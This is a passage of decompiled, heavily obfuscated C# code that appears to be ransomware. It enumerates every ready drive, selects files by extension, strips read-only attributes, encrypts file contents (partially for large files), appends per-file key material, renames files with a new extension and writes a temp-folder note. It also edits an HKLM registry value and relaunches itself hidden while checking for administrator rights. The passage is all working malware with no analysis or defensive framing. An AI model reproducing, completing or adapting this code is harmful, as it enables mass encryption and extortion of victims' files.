			YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107392442)), MltDPGcncVSc(getString_0(107391807)));
			YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107391746)), MltDPGcncVSc(getString_0(107391697)));
		}
		catch
		{
		}
	}

	public static void GVeTLYiMKjVRgswna(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(MltDPGcncVSc(getString_0(107391656)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void rctHTEABuYQ()
	{
		string string_ = ViJjhZRbVgIOJj(getString_0(107391599));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(MltDPGcncVSc(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(MltDPGcncVSc(getString_0(107392062)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void gWCaCvnOhfPBas()
	{
		YoVGDQybWWFICjtj(getString_0(107397178), MltDPGcncVSc(getString_0(107392029)));
		string text = MltDPGcncVSc(getString_0(107391291));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391226) + text + getString_0(107391226) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397178);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void biLTXvjLCaAD(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (VZbRouVLPuojXZ)
			{
				try
				{
					File.AppendAllText(wYgKBMneFetPI, getString_0(107391221) + string_0 + getString_0(107391212) + ex.Message + getString_0(107396671));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string hwYAdwGTOvJd()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393351);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107391123);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107391178))) ? getString_0(107391128) : getString_0(107391169));
				break;
			case 0:
				text = getString_0(107391151);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107391118);
				break;
			case 4:
				text = getString_0(107391137);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107391087) : getString_0(107391096));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107391575) : getString_0(107391100)) : getString_0(107391105)) : getString_0(107391114));
				break;
			case 10:
				text = getString_0(107391570);
				break;
			}
		}
		if (text != getString_0(107393351))
		{
			text = getString_0(107391565) + text;
			if (oSVersion.ServicePack != getString_0(107393351))
			{
				text = text + getString_0(107391584) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string dWXjJswFfadXBJD(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395684);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(MltDPGcncVSc(getString_0(107395651)));
				streamWriter.WriteLine(getString_0(107396671));
				streamWriter.WriteLine(MltDPGcncVSc(getString_0(107393785)));
				streamWriter.WriteLine(string_0);
				if (QLNkNOgrJAesSS)
				{
					streamWriter.WriteLine(getString_0(107396671));
					streamWriter.WriteLine(MltDPGcncVSc(getString_0(107393707)));
					streamWriter.WriteLine(IknfuhEjRGfqaq.CnslaQynQWw());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !mcFzFNtJADHq)
				{
					File.AppendAllText(text, getString_0(107393674) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (VZbRouVLPuojXZ)
			{
				try
				{
					File.AppendAllText(wYgKBMneFetPI, getString_0(107391547) + ex.Message + getString_0(107396671));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void IVbJXIjQTTnQcR(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		ZYzLrWjVoLy.dyuzkYQJbbM CS_0024_003C_003E8__locals0 = new ZYzLrWjVoLy();
		CS_0024_003C_003E8__locals0.gjoTKhXYypQOsB = string_1;
		CS_0024_003C_003E8__locals0.dLWfZcHbsCgSWHAa = string_2;
		CS_0024_003C_003E8__locals0.zRHTzRtzxx = string_3;
		CS_0024_003C_003E8__locals0.FhNyfHtQGatr = string_4;
		GAYqeKKGxXouZl = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zRHTzRtzxx);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107391522))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !GihwuaHpSXPKUIVR.Contains(array[i].Name))
					{
						GihwuaHpSXPKUIVR.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!GihwuaHpSXPKUIVR.Contains(string_0[j]))
				{
					GihwuaHpSXPKUIVR.Add(string_0[j]);
				}
			}
		}
		if (GihwuaHpSXPKUIVR.Contains(MltDPGcncVSc(getString_0(107391481))) && flDWlzyqRqaM == getString_0(107396781))
		{
			GihwuaHpSXPKUIVR.Remove(MltDPGcncVSc(getString_0(107391481)));
		}
		Parallel.ForEach(GihwuaHpSXPKUIVR, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new ZYzLrWjVoLy.dyuzkYQJbbM();
			CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.OLHoUseHYYJ = string_0;
			if (CUaMwlrEkxsAzb && !hwYAdwGTOvJd().Contains(ZYzLrWjVoLy.getString_0(107391096)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						gHuiPfDiOmnH(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.OLHoUseHYYJ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (bqciLIMtJOIROzlgHA == ZYzLrWjVoLy.getString_0(107396790))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					FAPoYsZdgFU(CS_0024_003C_003E8__locals0.OLHoUseHYYJ, CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT.gjoTKhXYypQOsB, CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT.FhNyfHtQGatr, CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT.dLWfZcHbsCgSWHAa, CS_0024_003C_003E8__locals0.bvjJPOmzMaRhjT.zRHTzRtzxx);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				FAPoYsZdgFU(CS_0024_003C_003E8__locals0.OLHoUseHYYJ, CS_0024_003C_003E8__locals0.gjoTKhXYypQOsB, CS_0024_003C_003E8__locals0.FhNyfHtQGatr, CS_0024_003C_003E8__locals0.dLWfZcHbsCgSWHAa, CS_0024_003C_003E8__locals0.zRHTzRtzxx);
			}
		});
	}

	public static void FAPoYsZdgFU(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393351));
		List<string> list3 = list2;
		if (bIpQDZdlBgurHV == getString_0(107396786))
		{
			list = tkbbPrTKhBwSIFb(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = tppPSiBJigCKaC.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((exDowJXfwP == getString_0(107396786) && !item.EndsWith(text)) || CRTChqfNsauJEL.Contains(item))
				{
					continue;
				}
				if (YFOyrvZGGOG == getString_0(107396781))
				{
					try
					{
						if (vUkfERdAEFuz.wCmpVaWZQxH(item))
						{
							vUkfERdAEFuz.jPSlTfusulGphZq(item);
						}
					}
					catch
					{
					}
				}
				CRTChqfNsauJEL.Add(item);
				if (!juoIXWLeiNsyc.Contains(Path.GetDirectoryName(item)))
				{
					juoIXWLeiNsyc.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (umFlqTFDrugp == getString_0(107396781) && fileStream.Length > Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024 && !list3.Contains(text))
					{
						if (sSOzpOZGePD == getString_0(107396781))
						{
							foreach (string item2 in NKDXYpykBZuNlnjW)
							{
								if (item.ToLower().EndsWith(item2) && KuTrHyLgjDea == getString_0(107396781))
								{
									if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393912), getString_0(107393907), getString_0(107393926), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && KuTrHyLgjDea == getString_0(107396786))
								{
									try
									{
										IknfuhEjRGfqaq.dlawoLgJAnZ(getString_0(107393912), getString_0(107393907), getString_0(107393926), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = AuOhTeyyHLvFQ.ClvHRCYMnWfdH(item, Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024);
						byte[] asxIYNrXdXG = AuOhTeyyHLvFQ.noDpVbcjLlBGQRR(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						AuOhTeyyHLvFQ.ItvzLPvYpktoAw(item, asxIYNrXdXG);
						if (string_2 != getString_0(107391472))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107391472))
					{
						OFfumpuObipK(item, item + string_2, GAYqeKKGxXouZl);
					}
					else
					{
						OFfumpuObipK(item, item + getString_0(107391499), GAYqeKKGxXouZl);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void volfkQPDDM(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		GLFJtOHmsMzYg.NdqjppxJYoBbt CS_0024_003C_003E8__locals0 = new GLFJtOHmsMzYg();
		CS_0024_003C_003E8__locals0.DtygzxwTYAXrqA = list_0;
		CS_0024_003C_003E8__locals0.dvKbEoMZndICx = string_1;
		CS_0024_003C_003E8__locals0.pIWDijeuhHf = string_2;
		CS_0024_003C_003E8__locals0.rXvEUmxLKNoI = string_3;
		CS_0024_003C_003E8__locals0.ZRQxscFigJiFTqlzT = new List<string> { getString_0(107393351) };
		if (exDowJXfwP == getString_0(107396786))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.DtygzxwTYAXrqA)
				{
					if (CS_0024_003C_003E8__locals0.pIWDijeuhHf.Length != 0)
					{
						string[] pIWDijeuhHf2 = CS_0024_003C_003E8__locals0.pIWDijeuhHf;
						int num2 = 0;
						while (num2 < pIWDijeuhHf2.Length)
						{
							string value2 = pIWDijeuhHf2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_072e;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.dvKbEoMZndICx))
						{
							goto IL_072e;
						}
					}
					catch (Exception)
					{
						goto IL_072e;
					}
					if (item.EndsWith(string_0) && !CRTChqfNsauJEL.Contains(item))
					{
						if (YFOyrvZGGOG == GLFJtOHmsMzYg.getString_0(107396798))
						{
							try
							{
								if (vUkfERdAEFuz.wCmpVaWZQxH(item))
								{
									vUkfERdAEFuz.jPSlTfusulGphZq(item);
								}
							}
							catch
							{
							}
						}
						CRTChqfNsauJEL.Add(item);
						if (!juoIXWLeiNsyc.Contains(Path.GetDirectoryName(item)))
						{
							juoIXWLeiNsyc.Add(Path.GetDirectoryName(item));
						}
						biLTXvjLCaAD(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex12)
							{
								if (VZbRouVLPuojXZ)
								{
									try
									{
										File.AppendAllText(wYgKBMneFetPI, GLFJtOHmsMzYg.getString_0(107391238) + item + GLFJtOHmsMzYg.getString_0(107408941) + ex12.Message + GLFJtOHmsMzYg.getString_0(107396688));
									}
									catch (Exception)
									{
									}
								}
								iMHVeSscbXPhxV++;
								goto end_IL_00ee_2;
							}
							if (umFlqTFDrugp == GLFJtOHmsMzYg.getString_0(107396798) && new FileInfo(item).Length > Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.ZRQxscFigJiFTqlzT.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new GLFJtOHmsMzYg.xOFkqIYdXy();
								CS_0024_003C_003E8__locals0.WbYYkjMiCfd = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.dvKbEoMZndICx != GLFJtOHmsMzYg.getString_0(107391489))
									{
										if (QLNkNOgrJAesSS)
										{
											CS_0024_003C_003E8__locals0.dvKbEoMZndICx = fCxIrHTFLNIsbC + CS_0024_003C_003E8__locals0.dvKbEoMZndICx;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.dvKbEoMZndICx);
									}
								}
								catch (Exception ex14)
								{
									if (VZbRouVLPuojXZ)
									{
										try
										{
											File.AppendAllText(wYgKBMneFetPI, GLFJtOHmsMzYg.getString_0(107391238) + item + GLFJtOHmsMzYg.getString_0(107408880) + ex14.Message + GLFJtOHmsMzYg.getString_0(107396688));
										}
										catch (Exception)
										{
										}
									}
									iMHVeSscbXPhxV++;
									goto end_IL_00ee_2;
								}
								CS_0024_003C_003E8__locals0.aQYTKEMxIxbK = GLFJtOHmsMzYg.getString_0(107393368);
								if (CS_0024_003C_003E8__locals0.dvKbEoMZndICx != GLFJtOHmsMzYg.getString_0(107391489))
								{
									CS_0024_003C_003E8__locals0.aQYTKEMxIxbK = item + CS_0024_003C_003E8__locals0.dvKbEoMZndICx;
								}
								else
								{
									CS_0024_003C_003E8__locals0.aQYTKEMxIxbK = item;
								}
								if (sSOzpOZGePD == GLFJtOHmsMzYg.getString_0(107396798))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in NKDXYpykBZuNlnjW)
										{
											if (CS_0024_003C_003E8__locals0.aQYTKEMxIxbK.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.WbYYkjMiCfd.dvKbEoMZndICx) && KuTrHyLgjDea == GLFJtOHmsMzYg.xOFkqIYdXy.getString_0(107396801))
											{
												if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.aQYTKEMxIxbK).Length)
												{
													try
													{
														IknfuhEjRGfqaq.dlawoLgJAnZ(GLFJtOHmsMzYg.xOFkqIYdXy.getString_0(107393932), GLFJtOHmsMzYg.xOFkqIYdXy.getString_0(107393927), GLFJtOHmsMzYg.xOFkqIYdXy.getString_0(107393946), CS_0024_003C_003E8__locals0.aQYTKEMxIxbK);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.aQYTKEMxIxbK.ToLower().EndsWith(item2) && KuTrHyLgjDea == GLFJtOHmsMzYg.xOFkqIYdXy.getString_0(107396806))
											{
												try
												{
													IknfuhEjRGfqaq.dlawoLgJAnZ(GLFJtOHmsMzYg.xOFkqIYdXy.getString_0(107393932), GLFJtOHmsMzYg.xOFkqIYdXy.getString_0(107393927), GLFJtOHmsMzYg.xOFkqIYdXy.getString_0(107393946), CS_0024_003C_003E8__locals0.aQYTKEMxIxbK);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = fMHndxNeKUmSVkyt.nZxYEdWrbFBDz(32);
								string s3 = wuGItxlauphjx.RfbDpcJdUFzPqTO(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = AuOhTeyyHLvFQ.ClvHRCYMnWfdH(CS_0024_003C_003E8__locals0.aQYTKEMxIxbK, Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024);
								AuOhTeyyHLvFQ.ItvzLPvYpktoAw(AsxIYNrXdXG: (!BFsJeResSpJpbjH) ? (mcFzFNtJADHq ? AuOhTeyyHLvFQ.noDpVbcjLlBGQRR(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : AuOhTeyyHLvFQ.noDpVbcjLlBGQRR(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.rXvEUmxLKNoI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (mcFzFNtJADHq ? oxCCkthrujAUT.CHDPlpVwKhLj(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : oxCCkthrujAUT.CHDPlpVwKhLj(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.rXvEUmxLKNoI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), aRhDHhZWWBA: CS_0024_003C_003E8__locals0.aQYTKEMxIxbK, sUotJzhLsEhNTFhP: bytes3);
							}
							else
							{
								if (QLNkNOgrJAesSS)
								{
									CS_0024_003C_003E8__locals0.dvKbEoMZndICx = fCxIrHTFLNIsbC + CS_0024_003C_003E8__locals0.dvKbEoMZndICx;
								}
								string text4 = fMHndxNeKUmSVkyt.nZxYEdWrbFBDz(32);
								string s4 = wuGItxlauphjx.RfbDpcJdUFzPqTO(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.dvKbEoMZndICx != GLFJtOHmsMzYg.getString_0(107391489))
								{
									if (!rdRqmOAazIcaE)
									{
										if (!mcFzFNtJADHq)
										{
											pakacOBHHbOndSfi(item, item + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, GAYqeKKGxXouZl);
										}
										else
										{
											pakacOBHHbOndSfi(item, item + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!mcFzFNtJADHq)
											{
												fseJKjvbGESfArR(item, item + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, GAYqeKKGxXouZl);
											}
											else
											{
												fseJKjvbGESfArR(item, item + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (VZbRouVLPuojXZ)
											{
												try
												{
													File.AppendAllText(wYgKBMneFetPI, GLFJtOHmsMzYg.getString_0(107391238) + item + GLFJtOHmsMzYg.getString_0(107391507) + ex16.Message + GLFJtOHmsMzYg.getString_0(107396688));
												}
												catch (Exception)
												{
												}
											}
											iMHVeSscbXPhxV++;
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!rdRqmOAazIcaE)
								{
									if (!mcFzFNtJADHq)
									{
										pakacOBHHbOndSfi(item, item + GLFJtOHmsMzYg.getString_0(107391516), GAYqeKKGxXouZl);
									}
									else
									{
										pakacOBHHbOndSfi(item, item + GLFJtOHmsMzYg.getString_0(107391516), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!mcFzFNtJADHq)
										{
											fseJKjvbGESfArR(item, item, GAYqeKKGxXouZl);
										}
										else
										{
											fseJKjvbGESfArR(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (VZbRouVLPuojXZ)
										{
											try
											{
												File.AppendAllText(wYgKBMneFetPI, GLFJtOHmsMzYg.getString_0(107391238) + item + GLFJtOHmsMzYg.getString_0(107391507) + ex18.Message + GLFJtOHmsMzYg.getString_0(107396688));
											}
											catch (Exception)
											{
											}
										}
										iMHVeSscbXPhxV++;
										goto end_IL_00ee_2;
									}
								}
								if (mcFzFNtJADHq)
								{
									if (CS_0024_003C_003E8__locals0.dvKbEoMZndICx != GLFJtOHmsMzYg.getString_0(107391489))
									{
										GVeTLYiMKjVRgswna(item + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, bytes4);
									}
									else
									{
										GVeTLYiMKjVRgswna(item, bytes4);
									}
								}
							}
							goto IL_072e;
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_072e;
						}
					}
					continue;
					IL_072e:
					CS_0024_003C_003E8__locals0.DtygzxwTYAXrqA.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.DtygzxwTYAXrqA, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new GLFJtOHmsMzYg.NdqjppxJYoBbt();
			CS_0024_003C_003E8__locals0.WbYYkjMiCfd = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.oZqvHCHaRhG = string_0;
			if (CS_0024_003C_003E8__locals0.pIWDijeuhHf.Length != 0)
			{
				string[] pIWDijeuhHf = CS_0024_003C_003E8__locals0.pIWDijeuhHf;
				int num = 0;
				while (num < pIWDijeuhHf.Length)
				{
					string value = pIWDijeuhHf[num];
					if (!CS_0024_003C_003E8__locals0.oZqvHCHaRhG.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.oZqvHCHaRhG.EndsWith(CS_0024_003C_003E8__locals0.dvKbEoMZndICx))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!CRTChqfNsauJEL.Contains(CS_0024_003C_003E8__locals0.oZqvHCHaRhG))
			{
				if (YFOyrvZGGOG == GLFJtOHmsMzYg.getString_0(107396798))
				{
					try
					{
						if (vUkfERdAEFuz.wCmpVaWZQxH(CS_0024_003C_003E8__locals0.oZqvHCHaRhG))
						{
							vUkfERdAEFuz.jPSlTfusulGphZq(CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
						}
					}
					catch
					{
					}
				}
				CRTChqfNsauJEL.Add(CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
				if (!juoIXWLeiNsyc.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.oZqvHCHaRhG)))
				{
					juoIXWLeiNsyc.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.oZqvHCHaRhG));
				}
				biLTXvjLCaAD(CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.oZqvHCHaRhG).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (VZbRouVLPuojXZ)
						{
							try
							{
								File.AppendAllText(wYgKBMneFetPI, GLFJtOHmsMzYg.getString_0(107391238) + CS_0024_003C_003E8__locals0.oZqvHCHaRhG + GLFJtOHmsMzYg.getString_0(107408941) + ex2.Message + GLFJtOHmsMzYg.getString_0(107396688));
							}
							catch (Exception)
							{
							}
						}
						iMHVeSscbXPhxV++;
						goto end_IL_0117_2;
					}
					if (umFlqTFDrugp == GLFJtOHmsMzYg.getString_0(107396798) && new FileInfo(CS_0024_003C_003E8__locals0.oZqvHCHaRhG).Length > Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.dvKbEoMZndICx != GLFJtOHmsMzYg.getString_0(107391489))
							{
								if (QLNkNOgrJAesSS)
								{
									CS_0024_003C_003E8__locals0.dvKbEoMZndICx = fCxIrHTFLNIsbC + CS_0024_003C_003E8__locals0.dvKbEoMZndICx;
								}
								File.Move(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + CS_0024_003C_003E8__locals0.dvKbEoMZndICx);
							}
						}
						catch (Exception ex4)
						{
							if (VZbRouVLPuojXZ)
							{
								try
								{
									File.AppendAllText(wYgKBMneFetPI, GLFJtOHmsMzYg.getString_0(107391238) + CS_0024_003C_003E8__locals0.oZqvHCHaRhG + GLFJtOHmsMzYg.getString_0(107408880) + ex4.Message + GLFJtOHmsMzYg.getString_0(107396688));
								}
								catch (Exception)
								{
								}
							}
							iMHVeSscbXPhxV++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.dvKbEoMZndICx != GLFJtOHmsMzYg.getString_0(107391489))
						{
							CS_0024_003C_003E8__locals0.oZqvHCHaRhG += CS_0024_003C_003E8__locals0.dvKbEoMZndICx;
						}
						if (sSOzpOZGePD == GLFJtOHmsMzYg.getString_0(107396798))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in NKDXYpykBZuNlnjW)
								{
									if (CS_0024_003C_003E8__locals0.oZqvHCHaRhG.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.WbYYkjMiCfd.dvKbEoMZndICx) && KuTrHyLgjDea == GLFJtOHmsMzYg.NdqjppxJYoBbt.getString_0(107396804))
									{
										if (Convert.ToInt32(hexLNfZyLAAt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.oZqvHCHaRhG).Length)
										{
											try
											{
												IknfuhEjRGfqaq.dlawoLgJAnZ(GLFJtOHmsMzYg.NdqjppxJYoBbt.getString_0(107393935), GLFJtOHmsMzYg.NdqjppxJYoBbt.getString_0(107393930), GLFJtOHmsMzYg.NdqjppxJYoBbt.getString_0(107393949), CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.oZqvHCHaRhG.ToLower().EndsWith(item3) && KuTrHyLgjDea == GLFJtOHmsMzYg.NdqjppxJYoBbt.getString_0(107396809))
									{
										try
										{
											IknfuhEjRGfqaq.dlawoLgJAnZ(GLFJtOHmsMzYg.NdqjppxJYoBbt.getString_0(107393935), GLFJtOHmsMzYg.NdqjppxJYoBbt.getString_0(107393930), GLFJtOHmsMzYg.NdqjppxJYoBbt.getString_0(107393949), CS_0024_003C_003E8__locals0.oZqvHCHaRhG);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = fMHndxNeKUmSVkyt.nZxYEdWrbFBDz(32);
						string s = wuGItxlauphjx.RfbDpcJdUFzPqTO(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = AuOhTeyyHLvFQ.ClvHRCYMnWfdH(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, Convert.ToInt32(zOOQvKyLYnQmc) * 1024 * 1024);
						AuOhTeyyHLvFQ.ItvzLPvYpktoAw(AsxIYNrXdXG: (!BFsJeResSpJpbjH) ? (mcFzFNtJADHq ? AuOhTeyyHLvFQ.noDpVbcjLlBGQRR(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : AuOhTeyyHLvFQ.noDpVbcjLlBGQRR(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.rXvEUmxLKNoI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (mcFzFNtJADHq ? oxCCkthrujAUT.CHDPlpVwKhLj(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : oxCCkthrujAUT.CHDPlpVwKhLj(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.rXvEUmxLKNoI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), aRhDHhZWWBA: CS_0024_003C_003E8__locals0.oZqvHCHaRhG, sUotJzhLsEhNTFhP: bytes);
					}
					else
					{
						if (QLNkNOgrJAesSS)
						{
							CS_0024_003C_003E8__locals0.dvKbEoMZndICx = fCxIrHTFLNIsbC + CS_0024_003C_003E8__locals0.dvKbEoMZndICx;
						}
						string text2 = fMHndxNeKUmSVkyt.nZxYEdWrbFBDz(32);
						string s2 = wuGItxlauphjx.RfbDpcJdUFzPqTO(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.dvKbEoMZndICx != GLFJtOHmsMzYg.getString_0(107391489))
						{
							if (!rdRqmOAazIcaE)
							{
								if (!mcFzFNtJADHq)
								{
									pakacOBHHbOndSfi(CS_0024_003C_003E8__locals0.oZqvHCHaRhG, CS_0024_003C_003E8__locals0.oZqvHCHaRhG + CS_0024_003C_003E8__locals0.dvKbEoMZndICx, GAYqeKKGxXouZl);
								}
								else
								{
